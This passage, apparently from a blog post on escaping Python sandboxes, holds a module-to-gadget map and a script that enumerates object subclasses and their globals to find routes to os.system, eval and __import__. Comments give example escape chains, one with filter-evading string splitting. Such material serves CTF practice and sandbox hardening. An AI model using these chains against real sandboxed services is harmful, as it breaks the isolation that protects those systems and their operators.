class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;_osx_support&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_pydecimal&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;_pyio&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;_sitebuiltins&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;_strptime&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_threading_local&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_weakrefset&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;abc&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;aifc&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;antigravity&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;argparse&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;ast&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;asynchat&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;asyncore&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;base64&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;bdb&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;binhex&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;bisect&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;bz2&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;cProfile&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;calendar&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;cgi&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;cgitb&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;chunk&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;cmd&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;code&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;codecs&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;codeop&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;colorsys&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;compileall&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;configparser&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;contextlib&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;copy&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;copyreg&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;crypt&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;csv&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;datetime&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;decimal&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;difflib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;dis&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;doctest&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;dummy_threading&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;enum&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;filecmp&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;fileinput&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;fnmatch&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;formatter&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;fractions&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;ftplib&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;functools&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;genericpath&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;getopt&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;getpass&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;gettext&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;glob&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;gzip&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;hashlib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;heapq&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;hmac&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;imaplib&#x27;</span>: [<span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;imghdr&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;imp&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;inspect&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;io&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;ipaddress&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;keyword&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;linecache&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;locale&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;lzma&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;macpath&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;macurl2path&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;mailbox&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;mailcap&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;mimetypes&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;modulefinder&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;netrc&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;nntplib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;ntpath&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;nturl2path&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;numbers&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;opcode&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;operator&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;optparse&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;os&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;pathlib&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pdb&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;pickle&#x27;</span>: [<span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pickletools&#x27;</span>: [<span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;pipes&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pkgutil&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;platform&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;plistlib&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;poplib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;posixpath&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;pprint&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;profile&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;pstats&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pty&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;py_compile&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pyclbr&#x27;</span>: [<span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;pydoc&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;queue&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;quopri&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;random&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;re&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;reprlib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;rlcompleter&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;runpy&#x27;</span>: [<span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;sched&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;secrets&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;selectors&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;shelve&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;shlex&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;shutil&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;signal&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;site&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;smtpd&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;smtplib&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;sndhdr&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;socket&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;socketserver&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;sre_compile&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;sre_constants&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;sre_parse&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;ssl&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;stat&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;statistics&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;string&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;stringprep&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;struct&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;subprocess&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;sunau&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;symbol&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;symtable&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;sysconfig&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;tabnanny&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tarfile&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;telnetlib&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tempfile&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;textwrap&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;this&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;threading&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;timeit&#x27;</span>: [<span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;token&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tokenize&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;trace&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;traceback&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;tracemalloc&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tty&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;turtle&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;types&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;typing&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;uu&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;uuid&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;warnings&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;wave&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;weakref&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;webbrowser&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;xdrlib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;zipapp&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;zipfile&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                <span class="built_in">print</span>(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        <span class="built_in">print</span>(i, f, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span 